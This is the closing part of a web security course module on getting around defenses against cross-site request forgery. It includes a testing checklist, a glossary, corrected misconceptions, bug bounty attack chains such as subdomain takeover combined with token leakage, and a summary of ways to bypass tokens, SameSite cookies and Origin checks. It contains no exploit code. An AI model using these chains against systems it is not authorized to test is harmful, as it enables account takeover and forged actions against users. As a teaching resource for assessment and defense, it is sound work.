METHOD/CONTENT-TYPE BYPASS TESTS:
  □ POST → GET → same action executes?
  □ POST → GET with _method=POST parameter?
  □ Content-Type: application/x-www-form-urlencoded → text/plain
  □ Server processes JSON in text/plain body?
  □ CSRF validation skipped for certain content types?
```

---

## 18. Key Terminology Reference

| Term | Definition |
|------|------------|
| **Token extraction** | Reading CSRF token from DOM, meta tags, or response via same-origin access |
| **Referer leakage** | CSRF token exposed in URL leaks to third-party servers via Referer header |
| **CORS misconfiguration** | Permissive CORS policy allowing attacker origin to read credentialed responses |
| **Subdomain takeover** | Claiming an unclaimed resource pointed to by a dangling DNS CNAME |
| **Dangling CNAME** | DNS CNAME pointing to an unclaimed or deleted external resource |
| **Same-site bypass** | Exploiting the fact that subdomains are same-site, bypassing SameSite restrictions |
| **Null origin** | Origin: null sent by sandboxed iframes, file://, and data: URLs |
| **Origin suffix bypass** | Exploiting weak .endswith() or substring checks on Origin header |
| **Referer suppression** | Using meta referrer policy to prevent Referer header from being sent |
| **Double-submit injection** | Attacker-controlled subdomain sets cookie value to match forged request body |
| **Token fixation** | Attacker sets or predicts the victim's CSRF token before it is used |
| **text/plain CSRF** | Using enctype="text/plain" form to send JSON body without CSRF token validation |
| **Method override** | Framework feature (X-HTTP-Method-Override, _method) allowing POST to simulate PUT/DELETE |
| **Cross-subdomain XSS** | XSS on a subdomain used to make same-site requests to the main application |
| **Chain composition** | Combining multiple partial bypasses to achieve complete CSRF defense bypass |

---

## 19. Common Misconceptions

### ❌ "Subdomain takeover bypasses CSRF tokens"
**Wrong.** Subdomain takeover bypasses SameSite, Origin, and Referer defenses. It does NOT bypass correctly implemented CSRF tokens because SOP still prevents cross-origin response reads. A separate token leakage vector is required.

### ❌ "Cross-subdomain XSS defeats all CSRF defenses"
**Wrong.** Cross-subdomain XSS defeats SameSite and (sometimes) Origin/Referer. It cannot read responses from the target application (SOP), so CSRF tokens are not directly extractable. A separate token leakage is still needed.

### ❌ "Origin: null is always safe to block"
**Wrong.** Legitimate sandboxed iframes send `Origin: null`. Blocking null may break legitimate functionality. However, allowing null without careful consideration enables the sandboxed iframe attack vector.

### ❌ "text/plain requests can't carry JSON"
**Wrong.** The server decides how to parse the body regardless of Content-Type. If a server processes `text/plain` bodies as JSON (or accepts either), an attacker can use a form with `enctype="text/plain"` to send JSON without triggering CORS preflight.

### ❌ "Method override is a niche legacy feature"
**Wrong.** Rails, Laravel, and older Express applications widely support method override. It is a common finding in web application assessments and a frequently overlooked CSRF bypass vector.

### ❌ "CORS wildcard (ACAO: *) enables CSRF"
**Wrong.** Wildcard ACAO cannot be combined with `credentials: include` — browsers block this combination. CSRF via CORS requires a specific origin allowlisted with `Access-Control-Allow-Credentials: true`.

---

## 20. Bug Bounty Reference

### High-Value Bypass Chains to Look For

```
CHAIN 1: Subdomain Takeover + Token Leakage → Full CSRF
  Find: dangling CNAME on any subdomain
  Find: CSRF token in any URL (reset links, confirmations)
  Chain: takeover provides same-site execution + Referer leak provides token

CHAIN 2: Subdomain XSS + Weak Origin Check → Partial CSRF
  Find: stored/reflected XSS on any subdomain
  Find: Origin validation uses substring/suffix matching
  Chain: XSS on subdomain passes weak Origin check + same-site cookie

CHAIN 3: CORS Misconfiguration → Token Read → CSRF
  Find: ACAO reflects Origin + ACAC: true on any endpoint
  Chain: read CSRF token from protected page + forge request with token

CHAIN 4: text/plain + JSON Processing → No-Token CSRF
  Find: endpoint accepts text/plain and processes as JSON
  Find: CSRF validation skipped for text/plain
  Chain: form with enctype=text/plain submits JSON payload

CHAIN 5: Double-Submit + Subdomain Takeover → Cookie Injection
  Find: application uses double-submit cookie pattern
  Find: any subdomain control (takeover or XSS)
  Chain: inject cookie from subdomain + submit matching body value
```

### Severity Amplifiers

```
A CSRF bypass that defeats a "protected" application is always higher severity
than a simple missing token:
  Missing token on unprotected endpoint: Medium/High
  Bypassing CSRF token via XSS chain: Critical (XSS + CSRF = ATO)
  Bypassing via subdomain takeover: High/Critical
  Bypassing via CORS misconfig: High/Critical (also a separate CORS finding)

Always report:
  1. The bypass technique as a separate finding
  2. The underlying weakness that enables it (subdomain takeover, CORS, etc.)
  3. The full chain to worst-case impact
  4. Each component as potentially a standalone finding
```

---

## 21. Module 7 Summary — What You Must Know Cold

```
BYPASS FRAMEWORK:
✓ Every defense has a trust assumption — find the gap in the assumption
✓ Most bypasses require chaining multiple primitives
✓ Same-origin XSS defeats everything simultaneously
✓ Cross-subdomain XSS defeats SameSite but NOT CSRF tokens (SOP still blocks reads)
✓ Subdomain takeover defeats SameSite but NOT CSRF tokens (same reason)

TOKEN BYPASS VECTORS:
✓ Same-origin XSS → read token from DOM or fetch response
✓ Token in URL → Referer header leaks it to third-party resources
✓ CORS misconfiguration → read response containing token cross-origin
✓ Predictable generation → calculate expected token
✓ Token not session-bound → use attacker's own token against victim

SAMESITE BYPASS VECTORS:
✓ Subdomain XSS → same-site request, cookies sent
✓ Subdomain takeover → same-site request, cookies sent
✓ GET state-changing endpoints → Lax navigation exception
✓ Lax+POST timing window → 2-min window after login

ORIGIN BYPASS VECTORS:
✓ Suffix/substring matching → register domain satisfying the weak check
✓ Null origin → sandboxed iframe sends Origin: null
✓ Absent Origin → server allows → use non-Origin-sending request type
✓ Subdomain in allowlist → compromise or take over that subdomain

DOUBLE-SUBMIT BYPASS:
✓ Requires subdomain control → inject cookie from subdomain
✓ Attacker controls both sides of comparison
✓ Signed double-submit defeats this (HMAC cannot be forged)

METHOD/CONTENT-TYPE:
✓ POST → GET → may skip CSRF validation
✓ text/plain → may skip CSRF validation but server processes JSON
✓ Method override → POST form simulates DELETE/PUT
✓ Always test method and content-type switching on every protected endpoint
```

---

*Next: Module 08 — JSON APIs, SPAs & Modern Architecture*  
*Does CSRF disappear in modern applications? fetch() with credentials,*
*token-based auth in cookies vs headers, CORS and CSRF interaction in SPAs,*
*and why "we use an API" is not a CSRF defense*